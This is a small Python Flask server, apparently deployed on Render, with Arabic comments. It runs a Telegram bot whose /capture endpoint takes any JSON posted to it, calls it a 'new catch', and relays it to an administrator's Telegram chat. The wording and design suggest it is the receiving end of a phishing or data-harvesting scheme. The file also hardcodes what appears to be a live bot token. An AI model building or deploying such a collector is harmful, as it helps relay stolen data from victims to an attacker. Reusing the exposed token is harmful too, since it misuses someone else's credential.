import base64, requests, io, os
from flask import Flask, request

app = Flask(__name__)

# التوكن الجديد
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701

@app.route('/', methods=['GET', 'POST'])
def handle_all():
    # هذا الجزء سيطبع في اللوكات أي حركة يرسلها تليجرام
    if request.method == 'POST':
        data = request.get_json(silent=True)
        print(f"--- وصل طلب جديد: {data} ---")
        
        if data and "message" in data:
            cid = data["message"]["chat"]["id"]
            # رد سريع للتأكد من الاتصال
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={"chat_id": cid, "text": "✅ هلا سيوفي، السيرفر استلم رسالتك الحين!"})
        return "OK", 200
    
    return "<h1>Server is Live 🚀</h1>"

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    print(f"--- صيد جديد: {d} ---")
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": ADMIN_ID, "text": f"🎯 صيد جديد وصلك: {d}"})
    return "OK"

if __name__ == '__main__':
    # رندر يستخدم بورت 10000 غالباً، هذا السطر يضمن التوافق
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
